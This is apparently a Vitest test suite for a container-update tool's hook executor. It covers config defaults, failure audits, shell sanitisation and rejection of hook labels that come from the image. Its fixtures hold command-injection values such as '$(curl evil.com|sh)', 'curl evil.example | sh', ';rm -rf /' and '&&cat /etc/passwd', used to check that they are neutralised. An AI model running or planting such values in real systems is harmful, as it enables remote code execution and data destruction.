import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest';
import HookExecutor from './HookExecutor.js';

function createLogger() {
  return {
    child: vi.fn().mockReturnValue({}),
  };
}

function createContainer(overrides = {}) {
  return {
    name: 'web',
    id: 'container-id',
    image: {
      name: 'ghcr.io/acme/web',
      tag: {
        value: '1.0.0',
      },
    },
    updateKind: {
      kind: 'tag',
      localValue: '1.0.0',
      remoteValue: '1.0.1',
    },
    labels: {},
    ...overrides,
  };
}

function createExecutor(overrides = {}) {
  return new HookExecutor({
    runHook: vi.fn(),
    getPreferredLabelValue: (labels, ddKey, wudKey) => labels?.[ddKey] ?? labels?.[wudKey],
    getLogger: createLogger,
    recordHookAudit: vi.fn(),
    ...overrides,
  });
}

describe('HookExecutor', () => {
  test('constructor should provide default logger and audit recorder when omitted', () => {
    const runHook = vi.fn();
    const executor = new HookExecutor({
      runHook,
      getPreferredLabelValue: () => undefined,
    });

    const config = executor.buildHookConfig(createContainer());
    expect(config.hookTimeout).toBe(60000);
    expect(() => executor.recordHookAudit('event', {}, 'success', 'ok')).not.toThrow();
  });

  test('constructor should throw when required dependencies are missing', () => {
    expect(() => new HookExecutor({} as never)).toThrow(
      'HookExecutor requires dependency "runHook"',
    );
  });

  test('buildHookConfig should read labels and apply defaults', () => {
    const executor = createExecutor();

    const defaultConfig = executor.buildHookConfig(createContainer());
    expect(defaultConfig).toEqual({
      hookPre: undefined,
      hookPost: undefined,
      hookPreAbort: true,
      hookTimeout: 60000,
      hookEnv: {
        DD_CONTAINER_NAME: 'web',
        DD_CONTAINER_ID: 'container-id',
        DD_IMAGE_NAME: 'ghcr.io/acme/web',
        DD_IMAGE_TAG: '1.0.0',
        DD_UPDATE_KIND: 'tag',
        DD_UPDATE_FROM: '1.0.0',
        DD_UPDATE_TO: '1.0.1',
      },
    });

    const withLabels = executor.buildHookConfig(
      createContainer({
        updateKind: {
          kind: 'digest',
          localValue: null,
          remoteValue: undefined,
        },
        labels: {
          'dd.hook.pre': 'echo pre',
          'wud.hook.post': 'echo post',
          'dd.hook.pre.abort': 'FALSE',
          'wud.hook.timeout': '120000',
        },
      }),
    );

    expect(withLabels.hookPre).toBe('echo pre');
    expect(withLabels.hookPost).toBeUndefined();
    expect(withLabels.hookPreAbort).toBe(false);
    expect(withLabels.hookTimeout).toBe(60000);
    expect(withLabels.hookEnv.DD_UPDATE_FROM).toBe('');
    expect(withLabels.hookEnv.DD_UPDATE_TO).toBe('');
  });

  test('buildHookConfig applies the default timeout for invalid timeout labels', () => {
    const executor = createExecutor();

    expect(
      executor.buildHookConfig(
        createContainer({
          labels: {
            'dd.hook.timeout': '120000ms',
          },
        }),
      ).hookTimeout,
    ).toBe(60000);

    expect(
      executor.buildHookConfig(
        createContainer({
          labels: {
            'wud.hook.timeout': '-1',
          },
        }),
      ).hookTimeout,
    ).toBe(60000);

    expect(
      executor.buildHookConfig(
        createContainer({
          labels: {
            'dd.hook.timeout': '0',
          },
        }),
      ).hookTimeout,
    ).toBe(60000);
  });

  test('isHookFailure and getHookFailureDetails should handle exit code and timeout failures', () => {
    const executor = createExecutor();

    expect(executor.isHookFailure({ exitCode: 0, timedOut: false })).toBe(false);
    expect(executor.isHookFailure({ exitCode: 1, timedOut: false })).toBe(true);
    expect(executor.isHookFailure({ exitCode: 0, timedOut: true })).toBe(true);

    expect(
      executor.getHookFailureDetails(
        'Pre-update',
        { timedOut: true, stderr: '', exitCode: 0 },
        5000,
      ),
    ).toBe('Pre-update hook timed out after 5000ms');
    expect(
      executor.getHookFailureDetails(
        'Post-update',
        { timedOut: false, stderr: 'permission denied', exitCode: 127 },
        5000,
      ),
    ).toBe('Post-update hook exited with code 127: permission denied');
  });

  test('runPreUpdateHook should skip execution when no pre hook is configured', async () => {
    const runHook = vi.fn();
    const executor = createExecutor({ runHook });

    await executor.runPreUpdateHook(
      createContainer(),
      {
        hookPre: '',
        hookPreAbort: true,
        hookTimeout: 1000,
        hookEnv: {},
      },
      {
        warn: vi.fn(),
      },
    );

    expect(runHook).not.toHaveBeenCalled();
  });

  test('runPreUpdateHook should execute hook and record success audit', async () => {
    const runHook = vi.fn().mockResolvedValue({
      exitCode: 0,
      stdout: 'completed',
      stderr: '',
      timedOut: false,
    });
    const recordHookAudit = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    const container = createContainer();
    await executor.runPreUpdateHook(
      container,
      {
        hookPre: 'echo pre',
        hookPreAbort: true,
        hookTimeout: 3000,
        hookEnv: { SAMPLE: 'true' },
      },
      {
        warn: vi.fn(),
      },
    );

    expect(runHook).toHaveBeenCalledWith('echo pre', {
      timeout: 3000,
      env: { SAMPLE: 'true' },
      label: 'pre-update',
    });
    expect(recordHookAudit).toHaveBeenCalledWith(
      'hook-pre-success',
      container,
      'success',
      'Pre-update hook completed: completed',
    );
  });

  test('runPreUpdateHook should throw when pre hook fails and abort is enabled', async () => {
    const runHook = vi.fn().mockResolvedValue({
      exitCode: 2,
      stdout: '',
      stderr: 'syntax error',
      timedOut: false,
    });
    const recordHookAudit = vi.fn();
    const warn = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    const container = createContainer();
    await expect(
      executor.runPreUpdateHook(
        container,
        {
          hookPre: 'exit 2',
          hookPreAbort: true,
          hookTimeout: 1000,
          hookEnv: {},
        },
        { warn },
      ),
    ).rejects.toThrow('Pre-update hook exited with code 2: syntax error');

    expect(recordHookAudit).toHaveBeenCalledWith(
      'hook-pre-failed',
      container,
      'error',
      'Pre-update hook exited with code 2: syntax error',
    );
    expect(warn).toHaveBeenCalledWith('Pre-update hook exited with code 2: syntax error');
  });

  test('runPreUpdateHook should rethrow non-pipeline errors from hook execution', async () => {
    const runHook = vi.fn().mockRejectedValue(new Error('spawn ENOENT'));
    const recordHookAudit = vi.fn();
    const warn = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    await expect(
      executor.runPreUpdateHook(
        createContainer(),
        {
          hookPre: 'missing-command',
          hookPreAbort: true,
          hookTimeout: 1000,
          hookEnv: {},
        },
        { warn },
      ),
    ).rejects.toThrow('spawn ENOENT');

    expect(recordHookAudit).not.toHaveBeenCalledWith(
      'hook-pre-failed',
      expect.anything(),
      'error',
      expect.any(String),
    );
    expect(warn).not.toHaveBeenCalled();
  });

  test('runPreUpdateHook should expose a stable error code for aborting failures', async () => {
    const runHook = vi.fn().mockResolvedValue({
      exitCode: 1,
      stdout: '',
      stderr: 'failed',
      timedOut: false,
    });
    const executor = createExecutor({ runHook });

    await expect(
      executor.runPreUpdateHook(
        createContainer(),
        {
          hookPre: 'exit 1',
          hookPreAbort: true,
          hookTimeout: 1000,
          hookEnv: {},
        },
        { warn: vi.fn() },
      ),
    ).rejects.toMatchObject({
      code: 'hook-execution-failed',
    });
  });

  test('runPreUpdateHook should continue when pre hook fails but abort is disabled', async () => {
    const runHook = vi.fn().mockResolvedValue({
      exitCode: 0,
      stdout: '',
      stderr: '',
      timedOut: true,
    });
    const recordHookAudit = vi.fn();
    const warn = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    await expect(
      executor.runPreUpdateHook(
        createContainer(),
        {
          hookPre: 'sleep 10',
          hookPreAbort: false,
          hookTimeout: 250,
          hookEnv: {},
        },
        { warn },
      ),
    ).resolves.toBeUndefined();

    expect(recordHookAudit).toHaveBeenCalledWith(
      'hook-pre-failed',
      expect.anything(),
      'error',
      'Pre-update hook timed out after 250ms',
    );
    expect(warn).toHaveBeenCalledWith('Pre-update hook timed out after 250ms');
  });

  test('runPostUpdateHook should skip execution when no post hook is configured', async () => {
    const runHook = vi.fn();
    const executor = createExecutor({ runHook });

    await executor.runPostUpdateHook(
      createContainer(),
      {
        hookPost: undefined,
        hookTimeout: 1000,
        hookEnv: {},
      },
      {
        warn: vi.fn(),
      },
    );

    expect(runHook).not.toHaveBeenCalled();
  });

  test('runPostUpdateHook should record success audit for successful execution', async () => {
    const runHook = vi.fn().mockResolvedValue({
      exitCode: 0,
      stdout: 'ok',
      stderr: '',
      timedOut: false,
    });
    const recordHookAudit = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    const container = createContainer();
    await executor.runPostUpdateHook(
      container,
      {
        hookPost: 'echo post',
        hookTimeout: 1000,
        hookEnv: { TEST: '1' },
      },
      {
        warn: vi.fn(),
      },
    );

    expect(runHook).toHaveBeenCalledWith('echo post', {
      timeout: 1000,
      env: { TEST: '1' },
      label: 'post-update',
    });
    expect(recordHookAudit).toHaveBeenCalledWith(
      'hook-post-success',
      container,
      'success',
      'Post-update hook completed: ok',
    );
  });

  test('runPostUpdateHook should record failures without throwing', async () => {
    const runHook = vi.fn().mockResolvedValue({
      exitCode: 0,
      stdout: '',
      stderr: '',
      timedOut: true,
    });
    const recordHookAudit = vi.fn();
    const warn = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    await expect(
      executor.runPostUpdateHook(
        createContainer(),
        {
          hookPost: 'sleep 10',
          hookTimeout: 50,
          hookEnv: {},
        },
        { warn },
      ),
    ).resolves.toBeUndefined();

    expect(recordHookAudit).toHaveBeenCalledWith(
      'hook-post-failed',
      expect.anything(),
      'error',
      'Post-update hook timed out after 50ms',
    );
    expect(warn).toHaveBeenCalledWith('Post-update hook timed out after 50ms');
  });

  test('runPostUpdateHook should rethrow non-pipeline hook errors', async () => {
    const runHook = vi.fn().mockRejectedValue(new Error('ipc disconnected'));
    const recordHookAudit = vi.fn();
    const warn = vi.fn();
    const executor = createExecutor({ runHook, recordHookAudit });

    await expect(
      executor.runPostUpdateHook(
        createContainer(),
        {
          hookPost: 'echo post',
          hookTimeout: 1000,
          hookEnv: {},
        },
        { warn },
      ),
    ).rejects.toThrow('ipc disconnected');

    expect(recordHookAudit).not.toHaveBeenCalledWith(
      'hook-post-failed',
      expect.anything(),
      'error',
      expect.any(String),
    );
    expect(warn).not.toHaveBeenCalled();
  });

  describe('buildHookConfig shell env sanitization', () => {
    test('sanitizes dollar-sign and paren command substitution in image tag', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          image: {
            name: 'registry.io/acme/web',
            tag: { value: '1.0.0$(curl evil.com|sh)' },
          },
        }),
      );
      // $, (, ), | each become _, and so does the space that would have split
      // 'curl' and 'evil.com|sh' into two arguments
      expect(config.hookEnv.DD_IMAGE_TAG).toBe('1.0.0__curl_evil.com_sh_');
    });

    test('sanitizes backtick command substitution in image name', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          image: {
            name: 'registry.io/acme/web`touch /pwned`',
            tag: { value: '1.0.0' },
          },
        }),
      );
      // backticks become _, and so does the space
      expect(config.hookEnv.DD_IMAGE_NAME).toBe('registry.io/acme/web_touch_/pwned_');
    });

    test('sanitizes semicolons and ampersands in update-from and update-to values', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          updateKind: {
            kind: 'tag',
            localValue: '1.0.0;rm -rf /',
            remoteValue: '2.0.0&&cat /etc/passwd',
          },
        }),
      );
      expect(config.hookEnv.DD_UPDATE_FROM).toBe('1.0.0_rm_-rf_/');
      expect(config.hookEnv.DD_UPDATE_TO).toBe('2.0.0__cat_/etc/passwd');
    });

    test('strips a leading dash so a value cannot parse as an option', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          image: {
            name: '--privileged registry.io/acme/web',
            tag: { value: '1.0.0' },
          },
        }),
      );

      expect(config.hookEnv.DD_IMAGE_NAME).toBe('privileged_registry.io/acme/web');
    });

    test('strips globbing characters so a value cannot expand against the cwd', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          image: {
            name: 'registry.io/acme/web',
            tag: { value: '1.0.0*?[a]{b}~' },
          },
        }),
      );

      expect(config.hookEnv.DD_IMAGE_TAG).toBe('1.0.0___a__b__');
    });

    test('sanitizes control characters including newline and null byte', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          name: 'container\nname',
          id: 'id\x00val',
          image: {
            name: 'registry.io/acme/web',
            tag: { value: '1.0.0' },
          },
          updateKind: {
            kind: 'tag',
            localValue: null,
            remoteValue: undefined,
          },
        }),
      );
      // newline (0x0a) and null (0x00) are control chars < 0x20, become _
      expect(config.hookEnv.DD_CONTAINER_NAME).toBe('container_name');
      expect(config.hookEnv.DD_CONTAINER_ID).toBe('id_val');
      expect(config.hookEnv.DD_UPDATE_FROM).toBe('');
      expect(config.hookEnv.DD_UPDATE_TO).toBe('');
    });

    test('sanitizes DEL character (0x7f) in env values', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          image: {
            name: 'registry.io/acme/web',
            tag: { value: `tag\x7fval` },
          },
        }),
      );
      expect(config.hookEnv.DD_IMAGE_TAG).toBe('tag_val');
    });

    test('sanitizes redirect and pipe characters in container name and id', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          name: 'web>>/etc/crontab',
          id: 'id<injected',
        }),
      );
      expect(config.hookEnv.DD_CONTAINER_NAME).toBe('web__/etc/crontab');
      expect(config.hookEnv.DD_CONTAINER_ID).toBe('id_injected');
    });

    test('returns empty string for undefined and null container fields', () => {
      const executor = createExecutor();
      // Simulate containers from test fixtures that omit name/id/image/tag/updateKind fields
      const config = executor.buildHookConfig({
        name: undefined as unknown as string,
        id: undefined as unknown as string,
        image: {
          name: undefined as unknown as string,
          tag: { value: undefined as unknown as string },
        },
        updateKind: {
          kind: undefined as unknown as string,
          localValue: undefined,
          remoteValue: null,
        },
        labels: {},
      });
      expect(config.hookEnv.DD_CONTAINER_NAME).toBe('');
      expect(config.hookEnv.DD_CONTAINER_ID).toBe('');
      expect(config.hookEnv.DD_IMAGE_NAME).toBe('');
      expect(config.hookEnv.DD_IMAGE_TAG).toBe('');
      expect(config.hookEnv.DD_UPDATE_KIND).toBe('');
      expect(config.hookEnv.DD_UPDATE_FROM).toBe('');
      expect(config.hookEnv.DD_UPDATE_TO).toBe('');
    });

    test('passes legitimate container and image values through unchanged', () => {
      const executor = createExecutor();
      const config = executor.buildHookConfig(
        createContainer({
          name: 'my-web-container',
          id: 'abc123def456abc123def456',
          image: {
            name: 'ghcr.io/acme/web-app',
            tag: { value: 'v2.3.1-rc.1' },
          },
          updateKind: {
            kind: 'digest',
            localValue: 'sha256:abc123def456',
            remoteValue: 'sha256:def456abc123',
          },
        }),
      );
      expect(config.hookEnv.DD_CONTAINER_NAME).toBe('my-web-container');
      expect(config.hookEnv.DD_CONTAINER_ID).toBe('abc123def456abc123def456');
      expect(config.hookEnv.DD_IMAGE_NAME).toBe('ghcr.io/acme/web-app');
      expect(config.hookEnv.DD_IMAGE_TAG).toBe('v2.3.1-rc.1');
      expect(config.hookEnv.DD_UPDATE_KIND).toBe('digest');
      expect(config.hookEnv.DD_UPDATE_FROM).toBe('sha256:abc123def456');
      expect(config.hookEnv.DD_UPDATE_TO).toBe('sha256:def456abc123');
    });
  });

  describe('resolveHookConfig image label provenance', () => {
    const originalHooksEnabled = process.env.DD_HOOKS_ENABLED;
    const originalAllowImageLabels = process.env.DD_HOOKS_ALLOW_IMAGE_LABELS;

    beforeEach(() => {
      process.env.DD_HOOKS_ENABLED = 'true';
      delete process.env.DD_HOOKS_ALLOW_IMAGE_LABELS;
    });

    afterEach(() => {
      if (originalHooksEnabled === undefined) {
        delete process.env.DD_HOOKS_ENABLED;
      } else {
        process.env.DD_HOOKS_ENABLED = originalHooksEnabled;
      }
      if (originalAllowImageLabels === undefined) {
        delete process.env.DD_HOOKS_ALLOW_IMAGE_LABELS;
      } else {
        process.env.DD_HOOKS_ALLOW_IMAGE_LABELS = originalAllowImageLabels;
      }
    });

    function createProvenanceHarness(
      imageLabels: Record<string, string> | null | undefined,
      overrides = {},
    ) {
      const warn = vi.fn();
      const inspectImageConfig = vi
        .fn()
        .mockResolvedValue(imageLabels === undefined ? undefined : { Labels: imageLabels });
      const inspectContainerSpec = vi
        .fn()
        .mockResolvedValue({ Image: 'sha256:image-id', Config: { Image: 'acme/web:1.0.0' } });
      const executor = createExecutor({
        getLogger: () => ({ child: vi.fn().mockReturnValue({}), warn }),
        inspectImageConfig,
        inspectContainerSpec,
        ...overrides,
      });
      const context = {
        dockerApi: { api: true },
        currentContainerSpec: { Image: 'sha256:image-id', Config: { Image: 'acme/web:1.0.0' } },
      };
      return { executor, warn, inspectImageConfig, inspectContainerSpec, context };
    }

    test('runs a hook label the operator set on the container', async () => {
      const { executor, inspectImageConfig, context } = createProvenanceHarness({
        'org.opencontainers.image.title': 'web',
      });

      const config = await executor.resolveHookConfig(
        createContainer({ labels: { 'dd.hook.pre': 'echo pre', 'dd.hook.post': 'echo post' } }),
        context,
      );

      expect(config.hookPre).toBe('echo pre');
      expect(config.hookPost).toBe('echo post');
      expect(inspectImageConfig).toHaveBeenCalledWith(
        context.dockerApi,
        'sha256:image-id',
        expect.anything(),
      );
    });

    test('ignores a hook label that comes from the image and warns without the command', async () => {
      const { executor, warn, context } = createProvenanceHarness({
        'dd.hook.pre': 'curl evil.example | sh',
      });
      const recordHookAudit = vi.fn();
      executor.recordHookAudit = recordHookAudit;

      const config = await executor.resolveHookConfig(
        createContainer({
          labels: { 'dd.hook.pre': 'curl evil.example | sh', 'dd.hook.post': 'echo post' },
        }),
        context,
      );

      expect(config.hookPre).toBeUndefined();
      expect(config.hookPost).toBe('echo post');
      expect(warn).toHaveBeenCalledTimes(1);
      expect(warn.mock.calls[0][0]).toContain('web');
      expect(warn.mock.calls[0][0]).toContain('dd.hook.pre');
      expect(warn.mock.calls[0][0]).not.toContain('evil.example');
      expect(recordHookAudit).not.toHaveBeenCalled();
    });

    test('uses the container value when it overrides the same key from the image', async () => {
      const { executor, warn, context } = createProvenanceHarness({
        'dd.hook.pre': 'echo from-image',
      });

      const config = await executor.resolveHookConfig(
        createContainer({ labels: { 'dd.hook.pre': 'echo from-operator' } }),
        context,
      );

      expect(config.hookPre).toBe('echo from-operator');
      expect(warn).not.toHaveBeenCalled();
    });

    test('ignores image supplied abort and timeout labels too', async () => {
      const { executor, warn, context } = createProvenanceHarness({
        'dd.hook.pre.abort': 'false',
        'dd.hook.timeout': '5000',
      });

      const config = await executor.resolveHookConfig(
        createContainer({
          labels: {
            'dd.hook.pre': 'echo pre',
            'dd.hook.pre.abort': 'false',
            'dd.hook.timeout': '5000',
          },
        }),
        context,
      );

      expect(config.hookPre).toBe('echo pre');
      expect(config.hookPreAbort).toBe(true);
      expect(config.hookTimeout).toBe(60000);
      expect(warn).toHaveBeenCalledTimes(2);
    });

    test('treats an image with null labels as carrying no hook labels', async () => {
      const { executor, context } = createProvenanceHarness(null);

      const config = await executor.resolveHookConfig(
        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
        context,
      );

      expect(config.hookPre).toBe('echo pre');
    });

    test('fails closed when image labels cannot be read and a pre or post hook label exists', async () => {
      for (const key of ['dd.hook.pre', 'dd.hook.post']) {
        const { executor, context } = createProvenanceHarness(undefined);

        await expect(
          executor.resolveHookConfig(createContainer({ labels: { [key]: 'echo hi' } }), context),
        ).rejects.toMatchObject({
          name: 'TriggerPipelineError',
          code: 'hook-provenance-unverified',
          message: expect.stringContaining('hook provenance could not be established'),
        });
      }
    });

    test('does not fail when image labels cannot be read and no pre or post hook label exists', async () => {
      const { executor, context } = createProvenanceHarness(undefined);

      const config = await executor.resolveHookConfig(
        createContainer({ labels: { 'dd.hook.timeout': '5000' } }),
        context,
      );

      expect(config.hookPre).toBeUndefined();
      expect(config.hookPost).toBeUndefined();
    });

    test('does no inspect when the container has no hook labels', async () => {
      const { executor, inspectImageConfig, inspectContainerSpec, context } =
        createProvenanceHarness(undefined);

      const config = await executor.resolveHookConfig(
        createContainer({ labels: { 'com.example.other': 'x' } }),
        context,
      );
      const noLabels = await executor.resolveHookConfig(
        createContainer({ labels: undefined }),
        context,
      );

      expect(config.hookPre).toBeUndefined();
      expect(noLabels.hookPre).toBeUndefined();
      expect(inspectImageConfig).not.toHaveBeenCalled();
      expect(inspectContainerSpec).not.toHaveBeenCalled();
    });

    test('does no inspect when hooks are disabled', async () => {
      process.env.DD_HOOKS_ENABLED = 'false';
      const { executor, inspectImageConfig, inspectContainerSpec, context } =
        createProvenanceHarness({ 'dd.hook.pre': 'echo pre' });

      const config = await executor.resolveHookConfig(
        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
        context,
      );

      expect(config.hookPre).toBe('echo pre');
      expect(inspectImageConfig).not.toHaveBeenCalled();
      expect(inspectContainerSpec).not.toHaveBeenCalled();
    });

    test('DD_HOOKS_ALLOW_IMAGE_LABELS restores the old behaviour without inspecting', async () => {
      process.env.DD_HOOKS_ALLOW_IMAGE_LABELS = ' TRUE ';
      const { executor, warn, inspectImageConfig, context } = createProvenanceHarness({
        'dd.hook.pre': 'echo pre',
      });

      const config = await executor.resolveHookConfig(
        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
        context,
      );

      expect(config.hookPre).toBe('echo pre');
      expect(warn).not.toHaveBeenCalled();
      expect(inspectImageConfig).not.toHaveBeenCalled();
    });

    test('DD_HOOKS_ALLOW_IMAGE_LABELS values other than true keep the check on', async () => {
      process.env.DD_HOOKS_ALLOW_IMAGE_LABELS = 'false';
      const { executor, context } = createProvenanceHarness({ 'dd.hook.pre': 'echo pre' });

      const config = await executor.resolveHookConfig(
        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
        context,
      );

      expect(config.hookPre).toBeUndefined();
    });

    test('inspects the container when the context carries no container spec', async () => {
      const { executor, inspectContainerSpec, inspectImageConfig, context } =
        createProvenanceHarness({});

      const config = await executor.resolveHookConfig(
        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
        { dockerApi: context.dockerApi, currentContainerSpec: null },
      );

      expect(config.hookPre).toBe('echo pre');
      expect(inspectContainerSpec).toHaveBeenCalledWith(
        context.dockerApi,
        expect.objectContaining({ id: 'container-id' }),
      );
      expect(inspectImageConfig).toHaveBeenCalledWith(
        context.dockerApi,
        'sha256:image-id',
        expect.anything(),
      );
    });

    test('inspects the container when no context is given', async () => {
      const { executor, inspectContainerSpec } = createProvenanceHarness({});

      const config = await executor.resolveHookConfig(
        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
      );

      expect(config.hookPre).toBe('echo pre');
      expect(inspectContainerSpec).toHaveBeenCalledWith(undefined, expect.anything());
    });

    test('fails closed when the container cannot be inspected', async () => {
      const { executor, context } = createProvenanceHarness(
        {},
        {
          inspectContainerSpec: vi.fn().mockRejectedValue(new Error('no such container')),
        },
      );

      await expect(
        executor.resolveHookConfig(createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }), {
          dockerApi: context.dockerApi,
          currentContainerSpec: null,
        }),
      ).rejects.toMatchObject({ code: 'hook-provenance-unverified' });
    });

    test('falls back to the configured image reference when the spec has no image id', async () => {
      const { executor, inspectImageConfig, context } = createProvenanceHarness({});

      await executor.resolveHookConfig(createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }), {
        dockerApi: context.dockerApi,
        currentContainerSpec: { Config: { Image: 'acme/web:1' } },
      });

      expect(inspectImageConfig).toHaveBeenCalledWith(
        context.dockerApi,
        'acme/web:1',
        expect.anything(),
      );
    });

    test('fails closed when the spec names no image', async () => {
      const { executor, inspectImageConfig, context } = createProvenanceHarness({});

      await expect(
        executor.resolveHookConfig(createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }), {
          dockerApi: context.dockerApi,
          currentContainerSpec: {},
        }),
      ).rejects.toMatchObject({ code: 'hook-provenance-unverified' });
      expect(inspectImageConfig).not.toHaveBeenCalled();
    });

    test('defaults fail closed when inspect helpers are not provided', async () => {
      const executor = createExecutor();

      await expect(
        executor.resolveHookConfig(createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }), {
          currentContainerSpec: { Image: 'sha256:image-id' },
        }),
      ).rejects.toMatchObject({ code: 'hook-provenance-unverified' });
    });

    test('also covers wud prefixed hook labels', async () => {
      const { executor, context } = createProvenanceHarness({ 'wud.hook.pre': 'echo pre' });

      const config = await executor.resolveHookConfig(
        createContainer({ labels: { 'wud.hook.pre': 'echo pre' } }),
        context,
      );

      expect(config.hookPre).toBeUndefined();
    });

    test('tolerates a logger without warn', async () => {
      const { executor, context } = createProvenanceHarness(
        { 'dd.hook.pre': 'echo pre' },
        { getLogger: () => undefined },
      );

      const config = await executor.resolveHookConfig(
        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
        context,
      );

      expect(config.hookPre).toBeUndefined();
    });
  });
});
